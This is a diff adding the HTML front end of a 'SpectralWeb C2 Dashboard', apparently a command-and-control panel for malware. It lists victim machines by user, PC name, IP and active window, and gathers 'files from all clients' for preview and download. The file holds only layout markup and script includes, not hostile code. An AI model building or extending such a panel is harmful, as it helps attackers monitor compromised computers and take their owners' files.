@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpectralWeb C2 Dashboard</title>
+    <link rel="stylesheet" href="css/dashboard.css">
+    <link rel="stylesheet" href="css/files.css">
+    <link rel="stylesheet" href="css/sidebar.css">
+    <link rel="stylesheet" href="css/header.css">
+    <link rel="stylesheet" href="css/search_bar.css">
+    <link rel="stylesheet" href="css/table_container.css">
+    <link rel="stylesheet" href="css/modal.css">
+    <link rel="stylesheet" href="css/background_modal.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css  ">
+    <link rel="stylesheet" href="css/alerts.css">
+</head>
+<body>
+    <div class="sidebar" id="sidebar">
+        <div class="filter-buttons">
+            <button id="filter-all" class="active">all</button>
+            <button id="filter-online">online</button>
+            <button id="filter-offline">offline</button>
+        </div>
+        <div class="menu-toggle" id="menuToggle">
+            <i class="fas fa-bars"></i>
+        </div>
+        <div class="icons">
+            <div class="icon" title="Files">
+                <i class="fas fa-folder"></i>
+            </div>
+            <div class="icon" title="Alerts">
+                <i class="fas fa-bell"></i>
+            </div>
+            <div class="icon" title="Stats">
+                <i class="fas fa-chart-line"></i>
+            </div>
+            <div class="icon" title="Settings">
+                <i class="fas fa-cog"></i>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content" id="mainContent">
+        <div class="header">
+            <h1 class="title">SpectralWeb C2 Dashboard</h1>
+            <div class="controls">
+                <button class="bg-btn" id="bgButton">
+                    <i class="fas fa-image"></i> Background
+                </button>
+                <button class="bg-btn" id="toggleView">
+                    <i class="fas fa-th"></i> Grid View
+                </button>
+                <div class="stats">
+                    <div class="stat-box">
+                        <div class="stat-value" id="online-count">0</div>
+                        <div class="stat-label">Online</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="total-count">0</div>
+                        <div class="stat-label">Total</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="offline-count">0</div>
+                        <div class="stat-label">Offline</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="search-bar">
+            <i class="fas fa-search"></i>
+            <input type="text" id="search-input" placeholder="Search clients...">
+        </div>
+
+        <div class="table-container">
+            <table class="clients-table" id="table-view">
+                <thead>
+                    <tr>
+                        <th>loc</th>
+                        <th>user</th>
+                        <th>pc-name</th>
+                        <th>last active</th>
+                        <th>ip</th>
+                        <th>active window</th>
+                        <th>id</th>
+                    </tr>
+                </thead>
+                <tbody id="clients-list">
+                </tbody>
+            </table>
+            <div class="clients-grid" id="grid-view" style="display: none;"></div>
+        </div>
+
+        <!-- Контейнер Files -->
+        <div class="files-container">
+            <div class="files-header">
+                <h2>Files from All Clients</h2>
+            </div>
+            <div class="files-grid" id="files-grid">
+                <!-- Сюда будут добавлены блоки файлов -->
+            </div>
+        </div>
+
+        <div class="alerts-container">
+            <div id="alerts-grid">
+                <!-- Сюда будут добавлены записи логов -->
+            </div>
+        </div>
+
+        <!-- Модальное окно просмотра файла -->
+        <div class="modal" id="fileViewModal">
+            <div class="modal-content" id="fileModalContent">
+                <div class="modal-header">
+                    <h2 id="fileModalTitle">File Preview</h2>
+                    <span class="close" id="closeFileModal">&times;</span>
+                </div>
+                <div class="modal-body" id="fileModalBody">
+                    <!-- Содержимое файла -->
+                </div>
+                <div class="modal-footer">
+                    <button class="btn-primary" id="downloadFileModal">Download</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="bgModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Select Background Theme</h2>
+                <span class="close" id="closeModal">&times;</span>
+            </div>
+            <div class="bg-options">
+                <div class="bg-option" data-bg="bg1">
+                    <img src="../images/bg1.jpg" alt="Background 1">
+                    <span>Theme 1</span>
+                </div>
+                <div class="bg-option" data-bg="bg2">
+                    <img src="../images/bg2.jpg" alt="Background 2">
+                    <span>Theme 2</span>
+                </div>
+                <div class="bg-option" data-bg="bg3">
+                    <img src="../images/bg3.jpg" alt="Background 3">
+                    <span>Theme 3</span>
+                </div>
+                <div class="bg-option" data-bg="bg4">
+                    <img src="../images/bg4.jpg" alt="Background 4">
+                    <span>Theme 4</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Остальные скрипты -->
+    <script src="js/modules/data/clients.js"></script>
+    <script src="js/modules/data/stats.js"></script>
+    <script src="js/modules/render/table.js"></script>
+    <script src="js/modules/render/grid.js"></script>
+    <script src="js/modules/render/main.js"></script>
+    <script src="js/modules/ui/background.js"></script>
+    <script src="js/modules/ui/sidebar.js"></script>
+    <script src="js/modules/ui/filters.js"></script>
+    <script src="js/modules/ui/search.js"></script>
+    <script type="module" src="js/modules/ui/files/files.js"></script>  <!-- Основной файл Files -->
+    <script type="module">
+        import { AlertsManager } from 'js/modules/ui/alerts/AlertsManager.js';
+
+        document.addEventListener('DOMContentLoaded', () => {
+            window.alertsManager = new AlertsManager('alerts-grid');
+        });
+    </script>
+    <script src="js/modules/websocket/connection.js"></script>
+    <script src="js/dashboard.js"></script>
+</body>
+</html>
